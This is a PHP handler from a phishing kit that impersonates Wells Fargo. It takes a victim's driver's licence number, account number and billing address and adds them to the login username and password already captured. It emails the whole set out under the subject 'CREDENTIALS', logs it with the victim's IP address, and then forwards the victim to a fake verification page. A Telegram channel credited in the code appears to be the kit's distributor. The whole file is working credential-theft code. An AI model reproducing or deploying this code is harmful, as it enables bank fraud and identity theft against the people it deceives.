<?php
error_reporting(0);
session_start();
set_time_limit(0);
include '../main.php';
if($_POST['j_dlnum'] == "" || $_POST['j_billing'] == '' || $_POST['j_accnt'] == '') {

    $error = 'Please Enter Valid DL Number/Account Number and Billing Address';
    echo "<META HTTP-EQUIV='refresh' content='0; URL=./../reset_account.php?error=".$error."&appIdKey=".$_SESSION['key']."&country=US'>";
    exit();
}
$j_dlnum = $_POST['j_dlnum'];
$j_accnt = $_POST['j_accnt'];
$j_billing = $_POST['j_billing'];

$_SESSION['j_dlnum'] = $j_dlnum;
$_SESSION['j_accnt'] = $j_accnt;
$_SESSION['j_billing'] = $j_billing;



$message  = "++-------------------------[ WELLS LOGIN ]-----------------------------++\n";
$message .= "Username			: ".$_SESSION['j_username']."\n";
$message .= "Password			: ".$_SESSION['j_password']."\n";
$message .= "DL NUMBER			: ".$_SESSION['j_dlnum']."\n";
$message .= "Account Number			: ".$_SESSION['j_accnt']."\n";
$message .= "Billing			: ".$_SESSION['j_billing']."\n";

$message .= "IP Address		: ".$ip2."\n";
$message .= "++--------------[ OLD CODE https://t.me/oldcode]---------------++\n";


sendMail('CREDENTIALS', $message);

$click = fopen("./logs/clicks.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);
$click = fopen("./logs/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,$message);
fclose($click);
echo "<META HTTP-EQUIV='refresh' content='0; URL=./../verify_account.php?error=&appIdKey=".$_SESSION['key']."&country=US'>";
exit();



